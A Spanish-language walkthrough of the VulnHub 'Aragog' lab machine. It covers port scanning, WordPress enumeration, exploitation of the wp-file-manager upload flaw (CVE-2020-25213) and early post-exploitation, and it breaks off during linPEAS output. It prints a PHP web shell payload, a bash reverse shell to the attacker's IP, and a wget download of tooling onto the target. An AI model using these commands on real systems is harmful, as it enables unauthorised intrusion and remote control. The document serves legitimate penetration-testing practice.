---
title: "Aragog - VulnHub"
date: 2024-11-06
draft: false
slug: "vulnhub-writeup-aragog"
excerpt: "Una máquina bastante sencilla, que puede ser útil para practicar el reconocimiento y explotación de vulnerabilidades de WordPress, pues para ganar acceso a la máquina, tenemos que explotar una vulnerabilidad de WordPress que nos permitirá ejecutar comandos de manera remota. Una vez dentro de la máquina, podemos usar linPEAS para encontrar vulnerabilidades en el sistema, así encontramos un archivo de WordPress que tiene el usuario y contraseña de la base de datos de MySQL. Enumeramos MySQL y encontramos el hash de la contraseña de un usuario, la cual crackeamos y obtenemos acceso a la cuenta de este usuario. Por último, identificamos un proceso en segundo plano usando pspy64, siendo este el que usaremos para escalar privilegios y convertirnos en Root."
categories: ["VulnHub", "Easy Machine"]
tags: ["Linux", "WordPress", "SSH", "MySQL", "Web Enumeration", "Fuzzing", "Virtual Hosting", "WordPress Enumeration", "Unauthenticated Arbitrary File Upload (RCE)", "CVE-2020-25213 (RCE)", "System Recognition (Linux)", "BurpSuite", "MySQL Enumeration", "Cracking Hash", "Abusing CRON Jobs", "Privesc - Abusing CRON Jobs", "Brute Force", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "whatweb"
  - "wfuzz"
  - "gobuster"
  - "wpscan"
  - "metasploit framework"
  - "msfconsole"
  - "Módulo: auxiliary/scanner/http/wordpress_scanner"
  - "searchsploit"
  - "python3"
  - "nc"
  - "wget"
  - "linpeas.sh"
  - "mysql"
  - "JohnTheRipper"
  - "pspy64"
  - "chmod"
  - "bash"
  - "burpsuite"
  - "hydra"
  - "base64"
links:
  - "https://www.exploit-db.com/exploits/51224"
  - "https://github.com/peass-ng/PEASS-ng/releases/tag/20241101-6f46e855"
  - "https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1"
  - "https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213"
showtoc: true
header:
  teaser: "/assets/images/vulnhub-writeup-aragog/aragog2.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.005
PING 192.168.1.005 (192.168.100.005) 56(84) bytes of data.
64 bytes from 192.168.1.005: icmp_seq=1 ttl=64 time=3.71 ms
64 bytes from 192.168.1.005: icmp_seq=2 ttl=64 time=1.04 ms
64 bytes from 192.168.1.005: icmp_seq=3 ttl=64 time=0.811 ms
64 bytes from 192.168.1.005: icmp_seq=4 ttl=64 time=0.819 ms

--- 192.168.1.005 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3027ms
rtt min/avg/max/mdev = 0.811/1.595/3.711/1.224 ms
```
Por el TTL sabemos que la máquina usa *****, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.005 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 13:49 CST
Initiating ARP Ping Scan at 13:49
Scanning 192.168.1.005 [1 port]
Completed ARP Ping Scan at 13:49, 0.05s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:49
Scanning 192.168.1.005 [65535 ports]
Discovered open port 80/tcp on 192.168.1.005
Discovered open port 22/tcp on 192.168.1.005
Completed SYN Stealth Scan at 13:49, 17.40s elapsed (65535 total ports)
Nmap scan report for 192.168.1.005
Host is up, received arp-response (0.00049s latency).
Scanned at 2024-11-06 13:49:06 CST for 17s
Not shown: 55302 closed tcp ports (reset), 10231 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:BF:E3:EA (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.64 seconds
           Raw packets sent: 82009 (3.608MB) | Rcvd: 55306 (2.212MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Solamente hay 2 puertos abiertos y me parece que todo será por web.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80 192.168.1.005 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 13:49 CST
Nmap scan report for 192.168.1.005
Host is up (0.00078s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

| ssh-hostkey: 
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))

|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:BF:E3:EA (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.15 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

En efecto, parece que toda la intrusión será por la web, investiguémosla.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/vulnhub-writeup-aragog/Captura1.png">
</p>

Solo se ve una imagen.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/vulnhub-writeup-aragog/Captura2.png">
</p>

Órale, nos sacó mucha información bastante útil que ya hasta nos dice por dónde puede ser vulnerable. Comprobaremos una vez más que **WordPress** es muy vulnerable.

Probemos con **whatweb**, por si algo se nos escapa:
```bash
whatweb http://192.168.1.005
http://192.168.1.005 [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.1.005]
```
Nada nuevo.

Es la hora de aplicar **Fuzzing** para ver qué podemos descubrir de esta página web.

### Fuzzing {#fuzz}

```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.005/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.005/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                              
=====================================================================

000000018:   301        9 L      28 W       317 Ch      "blog"                              
000001059:   301        9 L      28 W       323 Ch      "javascript"                             
000045226:   200        5 L      11 W       97 Ch       "http://192.168.1.005/"                       
000095510:   403        9 L      28 W       280 Ch      "server-status"           

Total time: 221.3993
Processed Requests: 220545
Filtered Requests: 220541
Requests/sec.: 996.1413
```

| Parámetros | Descripción |
|---|---|
| *-c*       | Para ver el resultado en un formato colorido. |
| *--hc*     | Para no mostrar un código de estado en los resultados. |
| *-t*       | Para indicar la cantidad de hilos a usar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |

Ahora probemos con **gobuster**:
```bash
gobuster dir -u http://192.168.1.005/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.005/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 317] [--> http://192.168.1.005/blog/]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.1.005/javascript/]
/server-status        (Status: 403) [Size: 280]
Progress: 220545 / 220546 (100.00%)
===============================================================
Finished
===============================================================
```

| Parámetros | Descripción |
|---|---|
| *-u*       | Para indicar la URL a utilizar. |
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Excelente, en ambos salen los mismos resultados, así que vayamos a ese directorio llamado **blog**:

<p align="center">
<img src="/assets/images/vulnhub-writeup-aragog/Captura3.png">
</p>

Parece que aquí es donde se esta mostrando el sitio de **WordPress**.

### Buscando Vulnerabilidades en WordPress con wpscan {#WP}

Veamos si podemos entrar en algún otro sitio de la página:

<p align="center">
<img src="/assets/images/vulnhub-writeup-aragog/Captura4.png">
</p>

Se está aplicando **Virtual Hosting**.

Registra ese dominio en tu `/etc/hosts` y recarga la página:
```bash
nano /etc/hosts

192.168.1.005 wordpress.aragog.hogwarts
```

<p align="center">
<img src="/assets/images/vulnhub-writeup-aragog/Captura5.png">
</p>

Listo, ya está cargando bien.

Pero no encontraremos mucho si seguimos buscando por ahí, así que de una vez usemos la herramienta **wpscan** para ver si encuentra algún plugin o tema vulnerable:
```bash
wpscan --url http://wordpress.aragog.hogwarts/blog
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://wordpress.aragog.hogwarts/blog/ [192.168.1.005]
[+] Started: Wed Nov  6 14:14:06 2024
,
Interesting Finding(s):
.
[+] Headers

 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
...
...
...
[+] WordPress version 5.0.12 identified (Insecure, released on 2021-04-15).

 | Found By: Rss Generator (Passive Detection)
 |  - http://wordpress.aragog.hogwarts/blog/?feed=rss2, <generator>https://wordpress.org/?v=5.0.12</generator>
 |  - http://wordpress.aragog.hogwarts/blog/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.0.12</generator>
.
[+] WordPress theme in use: twentynineteen

 | Location: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/style.css?ver=1.2
 | Style Name: Twenty Nineteen
 | Style URI: https://github.com/WordPress/twentynineteen
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/style.css?ver=1.2, Match: 'Version: 1.2'
.
[+] Finished: Wed Nov  6 14:14:10 2024
[+] Requests Done: 170
[+] Cached Requests: 5
[+] Data Sent: 47.823 KB
[+] Data Received: 305.451 KB
[+] Memory used: 260.258 MB
[+] Elapsed time: 00:00:03
```
Parece que encontró que el **tema twentynineteen** es posible vulnerarlo, pero de una vez te digo que de momento no es factible el Exploit que encontremos, así que vamos a buscar un poco más agresivos y específicos.

Agreguemos unos parámetros extras:
```bash
wpscan --url http://wordpress.aragog.hogwarts/blog/ --enumerate u,vp --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://wordpress.aragog.hogwarts/blog/ [192.168.1.005]
[+] Started: Wed Nov  6 14:31:21 2024

Interesting Finding(s):

[+] Headers

 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
...
...
[+] WordPress version 5.0.12 identified (Insecure, released on 2021-04-15).

 | Found By: Rss Generator (Passive Detection)
 |  - http://wordpress.aragog.hogwarts/blog/?feed=rss2, <generator>https://wordpress.org/?v=5.0.12</generator>
 |  - http://wordpress.aragog.hogwarts/blog/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.0.12</generator>
.
[+] WordPress theme in use: twentynineteen

 | Location: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/
 | Last Updated: 2024-07-16T00:00:00.000Z
 | Readme: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/style.css?ver=1.2
 | Style Name: Twenty Nineteen
 | Style URI: https://github.com/WordPress/twentynineteen
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/style.css?ver=1.2, Match: 'Version: 1.2'
.
[+] Enumerating Vulnerable Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:00:06 <=================================> (7343 / 7343) 100.00% Time: 00:00:06
[+] Checking Plugin Versions (via Passive and Aggressive Methods)
.
[i] No plugins Found.
.
[+] Finished: Wed Nov  6 14:31:34 2024
[+] Requests Done: 7402
[+] Cached Requests: 6
[+] Data Sent: 2.207 MB
[+] Data Received: 1.309 MB
[+] Memory used: 253.43 MB
[+] Elapsed time: 00:00:12
```
Nada tampoco.

En mi caso, no hay plata para usar la **API de wpscan**, pues esta nos daría mucha más información, así que vamos a usar un módulo de **metasploit** para ver si encuentra algo.

### Probando Módulo de Metasploit Framework para Encontrar Vulnerabilidades en WordPress {#WordPressMod}

Inicia **metasploit** y busca el módulo que nos ayude a buscar vulnerabilidades en **WordPress**:
```bash
msfconsole
msf6 > search wordpress scanner

Matching Modules
================

   #   Name                                                           Disclosure Date  Rank    Check  Description
   -   ----                                                           ---------------  ----    -----  -----------
   0   auxiliary/scanner/http/wp_abandoned_cart_sqli                  2020-11-05       normal  No     Abandoned Cart for WooCommerce SQLi Scanner
...
...
...
   33  auxiliary/scanner/http/wordpress_scanner                       .                normal  No     Wordpress Scanner
...
...
```
Vamos a usar el módulo `auxiliary/scanner/http/wordpress_scanner`.

Probémoslo:
```bash
msf6 > use auxiliary/scanner/http/wordpress_scanner
msf6 auxiliary(scanner/http/wordpress_scanner) > set RHOSTS 192.168.1.005
RHOSTS => 192.168.1.005
msf6 auxiliary(scanner/http/wordpress_scanner) > set TARGETURI /blog
msf6 auxiliary(scanner/http/wordpress_scanner) > exploit

[*] Trying 192.168.1.005
[+] 192.168.1.005 - Detected Wordpress 5.0.12
[*] 192.168.1.005 - Enumerating Themes
[*] 192.168.1.005 - Progress  0/3 (0.0%)
[*] 192.168.1.005 - Finished scanning themes
[*] 192.168.1.005 - Enumerating plugins
[*] 192.168.1.005 - Progress   0/64 (0.0%)
[+] 192.168.1.005 - Detected plugin: wp-file-manager version 6.0
[*] 192.168.1.005 - Finished scanning plugins
[*] 192.168.1.005 - Searching Users
[*] 192.168.1.005 - Was not able to identify users on site using /blog/wp-json/wp/v2/users
[*] 192.168.1.005 - Finished all scans
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Parece que detecto un plugin vulnerable.

Vamos a buscar si existe un exploit para el **plugin wp-file-manager version 6.0**:
* <a href="https://www.exploit-db.com/exploits/51224" target="_blank">WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE</a>

Ya encontramos uno y puede que exista en nuestro Kali, así que vamos a buscarlo:
```bash
searchsploit WP-file-manager v6.9
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path

|---|---|
WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE         | php/webapps/51224.py

|---|---|
Shellcodes: No Results
```
Ahí está.

Cópialo en tu directorio de trabajo para poder usarlo:
```bash
searchsploit -m php/webapps/51224.py
  Exploit: WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE
      URL: https://www.exploit-db.com/exploits/51224
     Path: /usr/share/exploitdb/exploits/php/webapps/51224.py
    Codes: CVE-2020-25213
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (501)
```

Antes de avanzar, podemos aplicar **Fuzzing** al directorio `/blog` para ver qué encuentra:
```bash
wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.005/blog/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.005/blog/FUZZ
Total requests: 220545

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000000227:   301        9 L      28 W       328 Ch      "wp-content"                                                                                                                                    
000007166:   301        9 L      28 W       326 Ch      "wp-admin"                                                                                                                                      
000000772:   301        9 L      28 W       329 Ch      "wp-includes"                                                                                                                                   
000045226:   200        147 L    777 W      13918 Ch    "http://192.168.1.005/blog/"                                                                                                                  

Total time: 0
Processed Requests: 220545
Filtered Requests: 220541
Requests/sec.: 0
```

Parece que encontró más páginas de **WordPress**, pero al investigarlas no tendremos permiso, a excepción de **wp-admin** que nos redirige al login.

Ahora sí, probemos el Exploit.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Exploit: WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE {#Exploit}

En mi caso, renombre el Exploit para identificarlo mejor.

Primero vamos a analizarlo.

Dentro del Exploit, podemos encontrar que hay una ruta que es vulnerable y es donde trabaja el Exploit, siendo la siguiente que está dentro de la función `exploit()`:
```python
upload_url = url+"/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
```
Parece que esta es la ruta que permite subir archivos.

Igual se ve la forma en que está cargando la Shell dentro de la variable `payload`:
```python
payload = "------WebKitFormBoundaryvToPIGA...<?php echo \"<pre>\" . shell_exec($_REQUEST['cmd']) . \"</pre>\";?>\r\n------Web...
```
Y, al final, lo manda todo como una **petición POST**.

Bueno, vamos a usar el Exploit:
```bash
python3 WP-file-manager-v69-exploit.py

[*] Uso: python3 WP-file-manager-v69-exploit.py "url" "comando"
[!] Ejemplo: python3 WP-file-manager-v69-exploit.py http://wordpress.local/ id
```
Muy bien, es muy raro la vez que me ha tocado un Exploit con instrucciones en español.

Tal como mencionan sus instrucciones, vamos a usar la URL y el comando **id** para ver si funciona:
```bash
python3 WP-file-manager-v69-exploit.py http://192.168.1.005/blog/ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Funciona.

Vamos a mandar una **Reverse Shell** para poder conectarnos remotamente. Sigue los siguientes pasos:

* Abre una **netcat** en el puerto **443**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

* Con el Exploit, manda nuestra **Reverse Shell** de confianza, indicando que se ejecute con **Bash**:
```bash
python3 WP-file-manager-v69-exploit.py http://192.168.1.005/blog/ "bash -c 'bash -i >& /dev/tcp/Tu_IP/443 0>&1'"
```
**OJO**: Esto va a dejar inutilizada la terminal donde estés ejecutando este Exploit.

* Observa la **netcat**:

```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.1.005] 46010
bash: cannot set terminal process group (486): Inappropriate ioctl for device
bash: no job control in this shell
<ress/wp-content/plugins/wp-file-manager/lib/files$
```
Ganamos acceso a la máquina.

Existe otra versión de este Exploit que puedes probar:
* <a href="https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213" target="_blank">Repositorio de mansoorr123: WP-file-manager expoit CVE-2020-25213</a>

Con esta versión, tú puedes subir tu propio payload malicioso.

## Post Explotación {#Post}

### Enumeración de la Máquina {#Enum}

Si no lo has hecho, obtén una sesión interactiva:
```bash
<ress/wp-content/plugins/wp-file-manager/lib/files$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
<ress/wp-content/plugins/wp-file-manager/lib/files$ ^Z
zsh: suspended  nc -nlvp 443
                                                                                                       
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
<ress/wp-content/plugins/wp-file-manager/lib/files$ export TERM=xterm
<ress/wp-content/plugins/wp-file-manager/lib/files$ export SHELL=bash
<ress/wp-content/plugins/wp-file-manager/lib/files$ stty rows 51 columns 189
```
Ahora sí, continuemos.

Veamos primero la información de nuestro usuario:
```bash
<ress/wp-content/plugins/wp-file-manager/lib/files$ whoami
whoami
www-data
<ress/wp-content/plugins/wp-file-manager/lib/files$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<ress/wp-content/plugins/wp-file-manager/lib/files$ sudo -l
sudo -l
bash: sudo: command not found
```
Parece que no vamos a poder hacer mucho.

Dentro de este directorio, encontramos la shell que creó el Exploit:
```bash
<ress/wp-content/plugins/wp-file-manager/lib/files$ ls
ls
shell.php
```

Vayamos al `/home` para ver con qué nos encontramos:
```bash
www-data@Aragog:/$ cd home      
cd home
www-data@Aragog:/home$ ls
ls
ginny
hagrid98
www-data@Aragog:/home$ cd ginny
cd ginny
www-data@Aragog:/home/ginny$ ls
ls
www-data@Aragog:/home/ginny$ ls -la
ls -la
total 8
drwxr-xr-x 2 ginny ginny 4096 Apr  1  2021 .
drwxr-xr-x 4 root  root  4096 Apr  1  2021 ..
www-data@Aragog:/home/ginny$ cd ../hagrid98
cd ../hagrid98
www-data@Aragog:/home/hagrid98$ ls
ls
horcrux1.txt
www-data@Aragog:/home/hagrid98$ ls -la
ls -la
total 28
drwxr-xr-x 3 hagrid98 hagrid98 4096 May  2  2021 .
drwxr-xr-x 4 root     root     4096 Apr  1  2021 ..
-rw-r--r-- 1 hagrid98 hagrid98  220 Apr  1  2021 .bash_logout
-rw-r--r-- 1 hagrid98 hagrid98 3526 Apr  1  2021 .bashrc
drwx------ 3 hagrid98 hagrid98 4096 Apr  1  2021 .gnupg
-rw-r--r-- 1 hagrid98 hagrid98  807 Apr  1  2021 .profile
-rw-r--r-- 1 hagrid98 hagrid98   91 Apr  1  2021 horcrux1.txt
www-data@Aragog:/home/hagrid98$ cat horcrux1.txt
cat horcrux1.txt
horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
```
Excelente, encontramos 2 usuarios y dentro del **directorio hagrid98**, encontramos el primer horocrux.

Podemos comprobar los usuarios desde el `/etc/passwd`, si es que podemos verlo:
```bash
www-data@Aragog:/home/hagrid98$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
ginny:x:1001:1001::/home/ginny:/bin/sh
hagrid98:x:1000:1000:Hagrid,,,:/home/hagrid98:/bin/bash
```
Sí podemos verlo. Observa que también aparece **mysql**, pero este lo revisaremos más adelante.

Veamos qué puertos están abiertos usando el oneliner de **Bash** que ocupamos en la **máquina OpenSource**:
```bash
www-data@Aragog:/home/hagrid98$ for port in {1..65535}; do echo > /dev/tcp/127.0.0.1/$port && echo "Port: $port open"; done 2>/dev/null
Port: 22 open
Port: 80 open
Port: 3306 open
Port: 47208 open
Port: 57784 open
```
Confirmamos que está operativo el **MySQL**.

Podríamos revisar qué procesos se están ejecutando, pero con este usuario, dudo que encontremos algo de provecho.

En este punto, no tenemos un privilegio y tampoco existe un binario del que nos podamos aprovechar, así que vamos a usar **linPEAS** para ver qué vulnerabilidades encuentra.

También podríamos usar el módulo `post/multi/recon/local_exploit_suggester` de **metasploit**, pero en mi caso, no encontró nada.

### Utilizando linPEAS para Encontrar una Forma de Escalar Privilegios {#linPEAS}

Comprobemos si tenemos las herramientas **curl o wget**:
```bash
www-data@Aragog:/home/hagrid98$ which wget
which wget
/usr/bin/wget
www-data@Aragog:/home/hagrid98$ which curl
which curl
```
Tenemos **wget**, así que descarga el **linPEAS** y cárgalo a la máquina usando un servidor de **Python**.

Puedes descargar **linPEAS** del siguiente link:
* <a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20241101-6f46e855" target="_blank">Repositorio de peass-ng: PEASS-ng - Releases</a>

Carguémoslo al directorio `/tmp` y le damos permisos de ejecución:
```bash
www-data@Aragog:/home/hagrid98$ cd /tmp
cd /tmp
www-data@Aragog:/tmp$ ls
ls
www-data@Aragog:/tmp$ wget http://Tu_IP/linpeas.sh
wget http://Tu_IP/linpeas.sh
--2024-11-07 02:47:25--  http://TU_IP/linpeas.sh
Connecting to TU_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 827739 (808K) [text/x-sh]
Saving to: 'linpeas.sh'

     0K .......... .......... .......... .......... ..........  6% 34.2M 0s
    50K .......... .......... .......... .......... .......... 12% 4.84M 0s
   100K .......... .......... .......... .......... .......... 18%  400M 0s
   150K .......... .......... .......... .......... .......... 24% 60.7M 0s
   200K .......... .......... .......... .......... .......... 30% 47.9M 0s
   250K .......... .......... .......... .......... .......... 37% 63.8M 0s
   300K .......... .......... .......... .......... .......... 43%  329M 0s
   350K .......... .......... .......... .......... .......... 49%  324M 0s
   400K .......... .......... .......... .......... .......... 55% 54.3M 0s
   450K .......... .......... .......... .......... .......... 61%  400M 0s
   500K .......... .......... .......... .......... .......... 68% 49.1M 0s
   550K .......... .......... .......... .......... .......... 74%  476M 0s
   600K .......... .......... .......... .......... .......... 80% 66.7M 0s
   650K .......... .......... .......... .......... .......... 86%  382M 0s
   700K .......... .......... .......... .......... .......... 92%  521M 0s
   750K .......... .......... .......... .......... .......... 98%  524M 0s
   800K ........                                              100%  251M=0.02s

2024-11-07 02:47:25 (44.6 MB/s) - 'linpeas.sh' saved [827739/827739]

www-data@Aragog:/tmp$ ls
ls
linpeas.sh
www-data@Aragog:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
```

Y ejecútalo:
```bash
www-data@Aragog:/tmp$ ./linpeas.sh
./linpeas.sh
                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
